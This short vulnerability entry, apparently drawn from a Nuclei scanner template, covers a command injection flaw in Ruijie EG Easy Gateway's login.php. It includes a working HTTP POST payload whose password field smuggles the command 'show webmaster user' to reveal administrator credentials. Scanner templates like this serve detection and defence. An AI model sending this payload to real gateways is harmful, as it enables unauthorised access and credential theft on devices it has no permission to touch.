# Vulnerability: Ruijie EG Easy Gateway - Remote Command Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`ruijie-eg-login-rce.yaml`)

## Description
Ruijie EG Easy Gateway login.php has remote commmand execution vulnerability, which can lead to the disclosure of administrator account and password.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin?show+webmaster+user
```

